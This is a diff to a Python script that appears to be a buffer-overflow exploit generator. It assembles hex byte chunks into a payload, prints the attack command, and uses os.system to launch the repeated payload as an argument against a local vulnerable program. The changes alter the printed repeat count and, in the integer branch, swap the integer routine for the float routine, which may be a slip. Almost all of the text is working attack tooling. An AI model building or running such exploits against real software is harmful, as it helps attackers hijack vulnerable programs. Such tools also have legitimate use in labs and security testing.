@@ -50,7 +50,7 @@ def explotationFloat():
 	reverse_array2 = array2.reverse()
 	stri1 = ''.join(array1)
 	exploit1 = "'"+stri1+"'"
-	print('\t',exploit1)
+	print('\t',exploit1,"* %s" %(int(chunkbytes)-1))
 	stri2 = ''.join(array2)
 	exploit2 = "'"+stri2+"'"
 	print('\t',exploit2)
@@ -63,7 +63,7 @@ def explotationInteger():
 	reverse_array1 = array1.reverse()
 	stri1 = ''.join(array1)
 	exploit1 = "'"+stri1+"'"
-	print('\t',exploit1)
+	print('\t',exploit1,"* %s" %(int(chunkbytes)))
 	print("[+] PYTHON EXPLOIT CODE:",'./%s $(python -c "print(%s*%s)")'%(vulnapp, exploit1,int(chunkbytes)))
 	print("[+] RESULTS:")
 	os.system('./%s $(python -c "print(%s*%s)")'%(vulnapp, exploit1,int(chunkbytes)))
@@ -112,4 +112,4 @@ else: #integer and round value, not float
 		for i in range(int(len(hex1WithoutxPlus0))//2):
 			array1.append(str(x)+hex1WithoutxPlus0[c:2+c])
 			c = c+2
-		explotationInteger()
+		explotationFloat()
